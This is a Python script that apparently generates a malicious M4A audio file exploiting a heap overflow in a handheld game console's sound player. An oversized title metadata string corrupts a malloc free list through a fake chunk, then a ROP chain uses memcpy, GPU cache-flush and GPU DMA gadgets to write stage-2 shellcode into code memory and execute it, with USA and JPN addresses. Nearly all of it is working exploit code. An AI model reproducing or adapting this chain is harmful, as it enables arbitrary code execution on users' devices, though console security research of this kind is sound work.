from struct import pack
from subprocess import call

def p(x):
  return pack("<I", x)

def pb(x):
  return pack(">I", x)

STAGE2_SIZE = 0x300

def get_shellcode():
  # assemble stage 2
  call(["arm-none-eabi-gcc", "-x", "assembler-with-cpp", "-nostartfiles",
        "-nostdlib", "-o", "stage2.bin", "stage2.s"])
  # generate raw instruction bytes
  call(["arm-none-eabi-objcopy", "-O", "binary", "stage2.bin"])
  # read in the shellcode
  with open('stage2.bin', 'rb') as f:
    payload = f.read()
    assert len(payload) == STAGE2_SIZE
    return payload

"""
u32 i don't know
u32 size
u32 prev
u32 next

goal:
{
  no idea
  >= desired size
  0
  0
}

2nd dword is current chunk size
3rd needs to be writable memory
4th dword starting at stack chunk is next pointer

2nd needs to be >= the desired size (I chose ~1024? for my ROP payload.)
4th ideally is 0 so it finds only the first chunk
"""

"""
fake malloc chunk, located on our stack :)

2nd dword needs to be big enough, and it is
3rd, 4th dword are null so it looks like the list is empty
0x15D62F10:  0x15D62F48 ; no idea
0x15D62F14:  0x15D62F54 ; >= desired size
0x15D62F18:  0x00000000 ; prev
0x15D62F1C:  0x00000000 ; next
"""

heapctx = 0x0039B560 # USA
#heapctx = 0x0039B520 # JPN

fake_free_chunk = 0x15D62F10
malloc_free_list_head = heapctx + 0x3C

what = fake_free_chunk
where = malloc_free_list_head

"""
we don't want the corrupted chunk to get added to the free
list when its freed, so put fake size data in the header
so it doesn't get added. not 100% if that's what this is,
my RE could be off
"""

start = 0x140018AF
end1 = 0x14001920
# end = end1 + end2 in the code, pick end2 so end wraps to start+4
desired_end = start + 4 # to make size 4
magic_end = (desired_end - end1) % 2**32
assert (end1 + magic_end) % 2**32 == desired_end

r1 = what
r2 = where - 12

UNICODE_MARKER = '\xff\xfe' # unicode marker

exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
exp += " \x00"*((772-len(exp)) / 2)
assert len(exp) == 772

exp += "aaaa" # base
exp += p(magic_end) # r3
exp += p(r2) # r2
exp += p(r1) # r1

#starts at this pop
#.text:0027DB00 LDMFD           SP!, {R4-R10,PC}

"""
.text:001B5A5C                 LDMFD           SP!, {R4-R6,LR}
.text:001B5A60                 B               sleep
"""

sleep_gadget = 0x001B5A5C

"""
.text:002E2954                 STMFD           SP!, {R4-R6,LR}
.text:002E2958                 MOV             R4, R0 <- jump here
.text:002E295C                 LDR             R0, =dword_30CF2C
.text:002E2960                 MOV             R6, R1
.text:002E2964                 LDR             R5, [R0]
.text:002E2968                 BL              unknown_libname_289 ; Unnamed sample library
.text:002E296C                 MOV             R3, R6
.text:002E2970                 MOV             R2, R4
.text:002E2974                 MOV             R1, R5
.text:002E2978                 LDMFD           SP!, {R4-R6,LR}
.text:002E297C                 B               sub_2E978C
"""
gpu_flushcache_gadget = 0x002E2958 # USA. Update required for non-USA.
#gpu_flushcache_gadget = 0x002E2830 # JPN

"""
.text:002E96FC                 BL              gsp__GetInterruptReceiver
.text:002E9700                 ADD             R0, R0, #0x58
.text:002E9704                 ADD             R1, SP, #4
.text:002E9708                 BL              gsp__EnqueueGpuCommand
.text:002E970C                 ADD             SP, SP, #0x24
.text:002E9710                 LDMFD           SP!, {R4-R11,PC}
"""
gpu_enqueue_gadget = 0x002E96FC # USA. Update required for non-USA.
#gpu_enqueue_gadget = 0x002E95D4 # JPN

# LDMFD           SP!, {R4-R10,LR}
memcpy_gadget = 0x0022DB1C

#002E6F80                 LDMFD           SP!, {R0,PC}
pop_r0_pc = 0x002e6f80 # USA. Update required for non-USA.
#pop_r0_pc = 0x002e6e58 # JPN

#.text:0022B6C8                 LDMFD           SP!, {R1,PC}
pop_r1_pc = 0x0022B6C8

"""
arm-none-eabi-gcc -x assembler-with-cpp -nostartfiles -nostdlib -o stage2.o stage2.s
arm-none-eabi-objcopy -O binary stage2.o
"""

payload = get_shellcode()
payload_stack_addr = 0x15D630C8

# avoid 0x2f6000
stage2_code_va = 0x002F5D00

"""
some gadgets:
0x002260E0: sleep function
0x002E2950: flushdatacache function
0x002E96FC: enqueuegpucommand
"""

# 0021462C                 LDMFD           SP!, {R2-R6,PC}
pop_r2_thru_r6_pc = 0x0021462C

def pa_to_gpu(pa):
  return pa - 0x0C000000

def gpu_to_pa(gpua):
  return gpua + 0x0C000000

# 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100" "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
def code_va_to_pa(va):
  return va + 0x27900000

payload_heap_addr = 0x14200000

rop  = "AAAA" # r4
rop += "BBBB" # r5
rop += "CCCC" # r6
rop += "DDDD" # r7
rop += "EEEE" # r8
rop += "FFFF" # r9
rop += "GGGG" # r10
rop += p(pop_r0_pc) # pc
rop += p(payload_heap_addr) # dst
rop += p(pop_r1_pc)
rop += p(payload_stack_addr) # src
rop += p(pop_r2_thru_r6_pc) #pc
rop += p(STAGE2_SIZE) #length
rop += "bbbb" # r3
rop += "cccc" # r4
rop += "dddd" # r5
rop += "eeee" # r6
rop += p(memcpy_gadget) # pc
rop += "aaaa" # r4
rop += "bbbb" # r5
rop += "cccc" # r6
rop += "dddd" # r7
rop += "eeee" # r8
rop += "ffff" # r9
rop += "gggg" # r10
rop += p(pop_r0_pc)
rop += p(payload_heap_addr) # r0
rop += p(pop_r1_pc)
rop += p(0x1000)
rop += p(gpu_flushcache_gadget)
rop += "bbbb" # r4
rop += "cccc" # r5
rop += "dddd" # r6
rop += p(gpu_enqueue_gadget)
rop += "aaaa" # skipped
rop += p(4)
rop += p(payload_heap_addr)
rop += p(pa_to_gpu(code_va_to_pa(stage2_code_va)))
rop += p(STAGE2_SIZE)
rop += p(0)
rop += p(0)
rop += p(8)
rop += p(0)
rop += "AAAA" # r4
rop += "AAAA" # r5
rop += "AAAA" # r6
rop += "AAAA" # r7
rop += "AAAA" # r8
rop += "AAAA" # r9
rop += "AAAA" # r10
rop += "AAAA" # r11
rop += p(pop_r0_pc) # pc
rop += p(0x10000000) # r0
rop += p(pop_r1_pc) # pc
rop += p(0) # r1
rop += p(sleep_gadget) # pc # {R4-R6,LR}
rop += "aaaa" # r4
rop += "bbbb" # r5
rop += "cccc" # r6
rop += p(stage2_code_va)
rop += payload

tkhd_data = 'A'*176 # padding
tkhd_data += rop # ROP starts here
tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
tkhd_data += '0000000000000000010000000000000000000000000000400000000000000000000000'.decode("hex")

assert len(tkhd_data) < 0x800 # so we don't allocate off the tail.

l = [('ftyp', '4d344120000000004d3441206d70343269736f6d00000000'),
    ('mdat', '00'),
    ('moov',
        [
        ('mvhd', '00'),
        ('trak',
            [
            ('tkhd', tkhd_data.encode("hex")),
            ('mdia',
                [
                ('mdhd', '00000000aac54f45aac54f4500003e800000940000000000'),
                ('hdlr', '0000000000000000736f756e00000000000000000000000000'),
                ('minf',
                    [
                    ('smhd', '0000000000000000'),
                    ('dinf',
                        [
                        ('dref', [('url ', '00000001')])
                        ]),
                    ('stbl',
                        [
                        ('stsd', [('mp4a', [('esds', '000000000380808022000200048080801440150018000000fa000000fa0005808080021408068080800102')])]),
                        ('stsz', '00'),
                        ('stts', '00000000000000010000002500000400'),
                        ('stco', '000000000000000100000028'),
                        ('stsc', '0000000000000001000000010000002500000001')
                        ])
                    ])
                ])
            ]),
        ('udta',
            [('meta', [
                ('hdlr', '00000000000000006d6469726170706c000000000000000000'),
                ('ilst',
                    [('\xa9nam', [('data', '0000000100000000' + (UNICODE_MARKER + exp).encode("hex"))]),
                     ('\xa9ART', [('data', '00000001000000004e6564')]),
                     ('\xa9alb', [('data', '00000001000000004e696e74656e646f2033445320536f756e64')]),
                     ('\xa9day', [('data', '000000010000000032303030')]),
                     ('edoc', [('data', '00000001000000003344533100')]),
                     ('wtfs', [('data', '0000000100000000303032303500')]),
                     ('dicr', [('data', '0000000100000000343935414236383100')]),
                     ('dide', [('data', '0000000100000000343935414236383100')]),
                     ('tmrp', [('data', '000000010000000075706c6f61642c65646974446973747269627574652c6669727374446973747269627574652c7365636f6e644469737472696275746500')])
                     ])
                ])
            ])
        ])
    ]

prefixes = {
    'meta': '\x00\x00\x00\x00',
    'stsd': '\x00\x00\x00\x00\x00\x00\x00\x01',
    'dref': '\x00\x00\x00\x00\x00\x00\x00\x01',
    'mp4a': '\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
}

def to_string(tree):
    def internal(tree):
        sz = 0
        ret = ""
        for name, data in tree:
            if type(data) is str:
                rdata = data.decode("hex")
                chunk_size = len(rdata)
            else:
                chunk_size, rdata = internal(data)
                chunk_size
            chunk_size += 8

            prefix = prefixes.get(name, '')
            rdata = prefix + rdata
            chunk_size += len(prefix)

            sz += chunk_size
            ret += pb(chunk_size) + name + rdata
        return sz, ret
    _, res = internal(tree)
    return res

with open('./soundhax.m4a', 'w') as f:
  f.write(to_string(l))
